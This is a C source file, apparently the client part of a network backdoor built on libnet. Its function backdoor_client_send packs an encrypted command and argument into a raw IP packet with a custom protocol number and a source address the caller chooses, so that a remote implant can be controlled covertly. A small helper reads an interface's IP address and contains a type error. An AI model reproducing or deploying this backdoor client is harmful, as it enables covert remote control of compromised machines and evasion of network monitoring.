#include <libnet.h>

#include "debug.h"
#include "send.h"
#include "backdoor.h"


char *get_ip_address(char *interface) {
 static char ret[17];
 struct libnet_link_int *hlibnet;
 char *err_libnet = NULL;
 u_long ip;

 if ((hlibnet = libnet_open_link_interface(interface, err_libnet)) == NULL) return -1;
 ip = libnet_get_ipaddr(hlibnet, interface, err_libnet);
 libnet_close_link_interface(hlibnet);
 ip = htonl(ip);

 snprintf(ret, 17, "%u.%u.%u.%u",
  *(((unsigned char*)&ip)+0),
  *(((unsigned char*)&ip)+1),
  *(((unsigned char*)&ip)+2),
  *(((unsigned char*)&ip)+3));

 return ret;
}


int backdoor_client_send(char *source, char *destination, int command, const char *argument, int argument_size) {
 u_long ip_source, ip_destination;
 int packet_size;
 u_char *packet;
 int socket;
 u_char payload[BACKDOOR_IP_PAYLOAD_SIZE];
 u_char encrypted[BACKDOOR_ENCRYPTED_SIZE];

 /* name resolutions */
 if ((ip_source = libnet_name_resolve(source, LIBNET_RESOLVE)) == -1)
  ERROR("libnet_name_resolve", -1);
 if ((ip_destination = libnet_name_resolve(destination, LIBNET_RESOLVE)) == -1)
  ERROR("libnet_name_resolve", -1);

 /* allocate packet memory */
 packet_size = LIBNET_IP_H + BACKDOOR_IP_PAYLOAD_SIZE;
 libnet_init_packet(packet_size, &packet); 
 if (packet == NULL) ERROR("libnet_init_packet", -1);

 /* initialize raw socket */
 if ((socket = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
  ERROR("libnet_open_raw_sock", -1);

 /* build payload */
 memset(payload, 0, BACKDOOR_IP_PAYLOAD_SIZE);
 payload[0] = BACKDOOR_DIRECTION_CLIENT_TO_SERVER;
 payload[1] = 0; /* unused ? */

 /* build encrypted data */
 memset(encrypted, 0, BACKDOOR_ENCRYPTED_SIZE);
 encrypted[0] = 0; /* unused ? */
 encrypted[1] = command+1;
 if (argument_size > BACKDOOR_ARGUMENT_SIZE)
  argument_size = BACKDOOR_ARGUMENT_SIZE;
 if (argument && argument_size != 0) memcpy(&encrypted[2], argument, argument_size);
 backdoor_encrypt(&payload[2], encrypted, BACKDOOR_ENCRYPTED_SIZE);

 /* build IP packet */
 if (libnet_build_ip(
  BACKDOOR_IP_PAYLOAD_SIZE, /* size of payload */
  0,                        /* IP TOS */
  255,                      /* IP ID */ 
  0,                        /* fragmentation */
  255,                      /* IP TTL */
  BACKDOOR_IP_PROTOCOL,     /* protocol */
  ip_source,                /* source IP */
  ip_destination,           /* destination IP */
  payload,                  /* payload */
  BACKDOOR_IP_PAYLOAD_SIZE, /* payload size */
  packet                    /* packet memory */
 ) == -1) ERROR("libnet_build_ip", -1);

 /* send IP packet */
 if (libnet_write_ip(socket, packet, packet_size) != packet_size)
  ERROR("libnet_write_ip", -1);

 /* terminate */
 libnet_close_raw_sock(socket);
 libnet_destroy_packet(&packet);
 return 0;
}
